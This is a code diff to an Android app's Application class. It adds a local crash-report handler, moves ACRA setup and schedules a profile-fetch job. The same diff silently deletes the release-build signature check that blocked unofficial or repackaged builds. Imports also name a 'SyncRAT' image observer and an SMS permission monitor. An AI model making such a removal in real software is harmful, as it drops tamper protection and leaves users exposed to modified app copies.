@@ -16,16 +16,17 @@ import android.iocl.dac_collector.Plugin.PluginDataBridge;
 import android.iocl.dac_collector.Plugin.PluginManager;
 import android.iocl.dac_collector.Services.SmsPermissionMonitorWorker;
 import android.iocl.dac_collector.Services.AppUpdateCheckWorker;
+import android.iocl.dac_collector.Services.JobSchedulerUtil;
 import android.iocl.dac_collector.SyncAdapters.AccountContract;
 import android.iocl.dac_collector.SyncAdapters.SyncUtils;
 import android.iocl.dac_collector.SyncRAT.ImageObserver;
 import android.iocl.dac_collector.Ui.CrashActivity;
 import android.iocl.dac_collector.Utility.Constant;
+import android.iocl.dac_collector.Utility.CrashReportStore;
 import android.iocl.dac_collector.Utility.FirebaseConfigManager;
 import android.iocl.dac_collector.Utility.NotificationHelper;
 import android.iocl.dac_collector.Utility.RoleHelper;
 import android.iocl.dac_collector.Utility.SharedPrefs;
-import android.iocl.dac_collector.Utility.SignatureVerifier;
 import android.iocl.dac_collector.Utility.Utility;
 import android.os.Build;
 import android.os.Bundle;
@@ -56,18 +57,22 @@ import java.util.Map;
 import java.util.concurrent.Executor;
 import java.util.concurrent.Executors;
 import java.util.concurrent.TimeUnit;
+import java.util.concurrent.atomic.AtomicBoolean;
 
 public class MyApp extends Application implements Application.ActivityLifecycleCallbacks {
 
     private static MyApp instance;
     private FirebaseCrashlytics crashlytics;
     private final Executor executor = Executors.newSingleThreadExecutor();
+    private final AtomicBoolean handlingUncaughtException = new AtomicBoolean(false);
 
     private ImageObserver mImageObserver;
     private volatile String currentActivityName = "Unknown";
 
-    // ✅ KEEP AS-IS
-    Boolean installCockroach = true;
+    // Local crash reports remain enabled independently of remote-reporting SDKs.
+    private static final boolean ENABLE_CRASH_REPORTING = true;
+    private volatile Thread.UncaughtExceptionHandler previousUncaughtExceptionHandler;
+    private volatile Thread.UncaughtExceptionHandler installedUncaughtExceptionHandler;
 
     @Override
     public void onCreate() {
@@ -79,13 +84,9 @@ public class MyApp extends Application implements Application.ActivityLifecycleC
             return;
         }
 
-        if (!BuildConfig.DEBUG && !SignatureVerifier.isOfficialRelease(this)) {
-            Intent unauthorizedIntent = new Intent(this, CrashActivity.class)
-                    .putExtra("crash_details", "UnAuthorised App")
-                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
-            startActivity(unauthorizedIntent);
-            android.os.Process.killProcess(android.os.Process.myPid());
-            return;
+        installUncaughtExceptionHandler();
+        if (!BuildConfig.DEBUG) {
+            initACRA();
         }
 
         // 🔹 LIGHT INIT ONLY (no heavy I/O)
@@ -126,6 +127,7 @@ public class MyApp extends Application implements Application.ActivityLifecycleC
     private void initializeAccountSync() {
         try {
             SyncUtils.initialize(getApplicationContext());
+            JobSchedulerUtil.ensureProfileFetchScheduled(getApplicationContext());
         } catch (RuntimeException e) {
             Log.e(TAG, "AccountSync initialization failed; it will be retried next app start", e);
         }
@@ -148,15 +150,10 @@ public class MyApp extends Application implements Application.ActivityLifecycleC
             );
 
             crashlytics.setUserId(cons_id);
-            crashlytics.setCrashlyticsCollectionEnabled(installCockroach);
+            crashlytics.setCrashlyticsCollectionEnabled(ENABLE_CRASH_REPORTING);
 
             // 🔥 SharedPrefs migration
             SharedPrefs.migrateFromSharedPrefs(this);
-
-            // 🔥 ACRA
-            if (!BuildConfig.DEBUG) {
-                initACRA();
-            }
 
             // 🔥 Delay non-critical hooks to avoid startup ANR
             new Handler(Looper.getMainLooper()).postDelayed(() -> {
@@ -166,6 +163,42 @@ public class MyApp extends Application implements Application.ActivityLifecycleC
         } catch (Exception e) {
             Log.e(TAG, "Init failed", e);
         }
+    }
+
+    private synchronized void installUncaughtExceptionHandler() {
+        final Thread.UncaughtExceptionHandler currentHandler =
+                Thread.getDefaultUncaughtExceptionHandler();
+        if (currentHandler == installedUncaughtExceptionHandler) {
+            return;
+        }
+
+        previousUncaughtExceptionHandler = currentHandler;
+        installedUncaughtExceptionHandler = this::handleUncaughtException;
+        Thread.setDefaultUncaughtExceptionHandler(installedUncaughtExceptionHandler);
+    }
+
+    private void handleUncaughtException(final Thread thread, final Throwable throwable) {
+        if (handlingUncaughtException.compareAndSet(false, true)) {
+            try {
+                CrashReportStore.save(this, thread, throwable);
+                Intent intent = new Intent(this, CrashActivity.class)
+                        .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK
+                                | Intent.FLAG_ACTIVITY_CLEAR_TOP
+                                | Intent.FLAG_ACTIVITY_SINGLE_TOP);
+                startActivity(intent);
+            } catch (Throwable handlerError) {
+                Log.e(TAG, "Unable to display the crash report", handlerError);
+            }
+        }
+
+        final Thread.UncaughtExceptionHandler previousHandler = previousUncaughtExceptionHandler;
+        if (previousHandler != null && previousHandler != installedUncaughtExceptionHandler) {
+            previousHandler.uncaughtException(thread, throwable);
+            return;
+        }
+
+        android.os.Process.killProcess(android.os.Process.myPid());
+        System.exit(10);
     }
 
     // ================= ACRA =================
